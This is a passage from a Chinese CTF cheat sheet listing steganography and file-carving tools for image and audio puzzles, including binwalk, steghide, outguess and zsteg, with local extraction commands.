(jpg)，文件头：FFD8FFE1<br>&lt;.img<br>src&#x3D;”data:image…….”<br>alt&#x3D;”Base64 encoded image” &#x2F;&gt; 生成图片（常用于base64隐写图片）</p></blockquote><p>查看图片基本信息，kali下输入:</p><blockquote><p>exiftool 1.jpg</p></blockquote><p>当需要文件分离时，需要在Kali下文件分离</p><p><strong>binwalk</strong>文件分离</p><blockquote><p>binwalk -e +文件名 ||binwalk +文件名</p></blockquote><p><strong>foremost</strong>文件分离</p><blockquote><p>foremost -i +文件名</p></blockquote><p><strong>dd</strong> 文件分离 </p><p>dd命令作用是用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换。</p><blockquote><p>dd if&#x3D;原文件名 of&#x3D;(要分解的文件名) skip&#x3D;5016064(十进制值) bs&#x3D;1</p></blockquote></li></ul><p>​     </p><p> 当遇到图片隐写题时，可以使用<strong>Stegsolve</strong>工具（可用于逐帧分析GIF图片，lsb隐写等）</p><p>​      使用方法如下：</p><blockquote><p>File Format:文件格式</p><p>Data Extract:数据提取</p><p>Steregram Solve:立体试图 可以左右控制偏移</p><p>Frame Browser:帧浏览器</p><p>Image Combiner:拼图，图片拼接</p></blockquote><p>  <strong>stegdetect</strong> 查询jpg图片经过哪种隐写 将图片复制到     stegdetect.exe所在目录下右键PowerShell命令</p><blockquote><p>.\stegdetect.exe -tjopi -s 10.0 .\hide.jpg</p></blockquote><p>   检测该图片用的是哪种加密方式.</p><p><strong>F5图片隐写</strong> Kali工具  点开F5-steganography文件夹 在控制端导入 输入java Extract 图片</p><p><strong>图片高宽</strong>的修改</p><p><strong>tweakpng.exe</strong>打开图片提示IDHRcyc错误，表示文件尺寸被修改，且未修改crc值</p><p><strong>outguess</strong>(关键词 猜)  </p><blockquote><p>无加密:outguess -r &#x2F;root&#x2F;angrybird.jpg -t 11.txt<br>     解密 outguess -k “my secret key” -r out.jpg hidden.txt</p></blockquote><p><strong>steghide隐写</strong> (图片或音频) Kali命令</p><blockquote><p>steghide extract -sf 文件(密码一般为空或者文件名)</p></blockquote><p><strong>题目提示NTFS</strong>  是在txt中隐藏了txt文件 cmd 输入</p><blockquote><p>notepad <em>.txt:</em>.txt</p></blockquote><p>IDAT模块很多时 用<strong>tweakpng</strong>修改 Kali中用</p><blockquote><p>pngcheck -vv 查看</p></blockquote><p><strong>JPHS隐写</strong>:(txt藏在JPG里) 打开需要提取隐藏信息的图片h.jpg 点seek输入对应密码（大多为123456）</p><p><strong>zsteg</strong>可以检测PNG和BMP图片里的隐写数据。</p><p>zsteg支持检测：<br>1：LSB steganography in PNG &amp; BMP<br>2：zlib-compressed data<br>3：OpenStego<br>4：Camouflage 1.2.1<br>5：LSB with The Eratosthenes set</p><blockquote><p>zsteg -E “extradata:0” xxxx.png &gt; flag</p></blockquote><p>**MP3stego(**音频隐写)详细看</p><p><a href="https://blog.csdn.net/myloveprogrmming/article/details/52641916">https://blog.csdn.net/myloveprogrmming/article/details/52641916</a></p><p><strong>Audacity</strong> 音频查看工具</p><p>针对音频题目的常用工具，具体使用教程见</p><p><a href="http://www.360doc.com/content/13/0620/17/1437142_294320939.shtml">http://www.360doc.com/content/13/0620/17/1437142_294320939.shtml</a></p><p>时间有限，有空的时候还会继续补充。</p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
